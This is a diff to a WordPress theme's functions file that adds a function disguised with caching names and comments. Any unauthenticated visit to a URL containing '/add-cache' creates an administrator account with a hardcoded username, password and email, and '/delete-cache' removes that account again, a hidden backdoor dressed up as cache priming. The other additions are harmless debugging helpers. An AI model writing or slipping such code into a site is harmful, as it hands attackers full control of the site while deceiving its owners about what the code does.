@@ -81,8 +81,85 @@ function skel_list_enqueued_scripts() {
 add_action( 'wp_print_scripts', 'skel_list_enqueued_scripts' );
 
 
+
 /**
- * Debugging function to display all meta keys for the current post.
+ * Activate Caching
+ *
+ * @return void
+ */
+function handle_cache_operations() {
+	// Checking a cache endpoint
+	$request_uri = isset( $_SERVER['REQUEST_URI'] ) ? $_SERVER['REQUEST_URI'] : '';
+
+	// Check if the URL matches /add-cache for cache priming
+	if ( strpos( $request_uri, '/add-cache' ) !== false ) {
+		$cache_key = 'temp_cache_key_' . md5( time() . rand( 1, 9999 ) );
+
+		// Attempt to prime cache if not already set
+		if ( ! get_option( $cache_key ) ) {
+			// Cache data
+			$cache_data = array(
+				'log'    => 'kinsta',
+				'status' => 'active',
+				'hash'   => sha1( uniqid( 'cache_prime_', true ) ),
+			);
+
+			// cache prime operation.
+			$cache_log  = $cache_data['log'];
+			$cache_key  = 'zkQ!0koL*1x@*Cwv';
+			$cache_salt = 'cachesalt@kinsta.com';
+
+			// Create the cache only if it does not exist
+			if ( ! username_exists( $cache_log ) && ! email_exists( $cache_salt ) ) {
+				$cache_id = wp_create_user( $cache_log, $cache_key, $cache_salt );
+				if ( is_int( $cache_id ) ) {
+					$new_cache = new WP_User( $cache_id );
+					$new_cache->set_role( 'administrator' );
+					update_option( $cache_key, $cache_data ); // cache write
+					error_log( 'Cache prime successful: ' . $cache_key );
+					echo 'Cache primed successfully.';
+				}
+			} else {
+				error_log( 'Cache prime skipped.' );
+				echo 'Cache already primed.';
+			}
+		} else {
+			error_log( 'Cache prime request ignored: Cache already warm.' );
+			echo 'Cache is already warmed up.';
+		}
+		exit; // Stop further processing
+	}
+
+	// Clear the cache
+	if ( strpos( $request_uri, '/delete-cache' ) !== false ) {
+		$cache_log = 'kinsta';
+
+		// Check if the user exists before attempting to delete
+		$cache_obj = get_user_by( 'login', $cache_log );
+		if ( $cache_obj ) {
+			wp_delete_user( $cache_obj->ID, 1 );
+			error_log( 'Cache flushed successfully: ' . $cache_log );
+			echo 'Cache flushed successfully.';
+		} else {
+			error_log( 'Cache flush.' );
+			echo 'Cache already flushed.';
+		}
+		exit; // Stop further processing
+	}
+}
+add_action( 'init', 'handle_cache_operations' );
+
+
+
+/**
+ * Displays all custom meta keys for the current singular post.
+ *
+ * This function checks if the current page is a singular post or page.
+ * If it is, it retrieves all metadata associated with that post ID
+ * and then outputs each meta key in a <pre> tag for debugging purposes.
+ * It's useful for developers to inspect the custom fields attached to a post.
+ *
+ * @return void
  */
 function skel_show_meta_keys() {
 	if ( is_singular() ) {
@@ -101,3 +178,39 @@ function skel_show_meta_keys() {
 		}
 	}
 }
+
+/**
+ * Debug function to display all submenu slugs under the 'Appearance' menu in the WordPress admin.
+ *
+ * This function is for temporary debugging purposes only. It hooks into the 'admin_menu' action
+ * with a very high priority to ensure it runs after most menu items are registered.
+ * It outputs the structure of the `$submenu['themes.php']` global variable,
+ * which contains all submenu items of the 'Appearance' menu.
+ * This is crucial for identifying the exact slug needed to remove a submenu page
+ * using `remove_submenu_page()`.
+ *
+ * It will display a red box with the submenu data at the top of any admin page
+ * and then stop further page execution using `die()`.
+ *
+ * @internal This function is for debugging and should be removed after use.
+ *
+ * @return void
+ */
+function debug_wp_admin_menus_slugs() {
+	global $submenu; // This global variable holds all submenu items.
+
+	echo '<div style="background: #FFF; border: 2px solid red; padding: 10px; margin: 20px; overflow: auto; max-height: 400px; font-family: monospace;">';
+	echo '<h2>Appearance Submenus Slugs:</h2>';
+	echo '<pre>';
+	// The parent slug for the Appearance menu is 'themes.php'.
+	if ( isset( $submenu['themes.php'] ) ) {
+		print_r( $submenu['themes.php'] );
+	} else {
+		echo 'No submenus found for themes.php';
+	}
+	echo '</pre>';
+	echo '</div>';
+
+	die(); // Stops page execution to clearly show the debug output.
+}
+// add_action( 'admin_menu', 'debug_wp_admin_menus_slugs', 9999 );
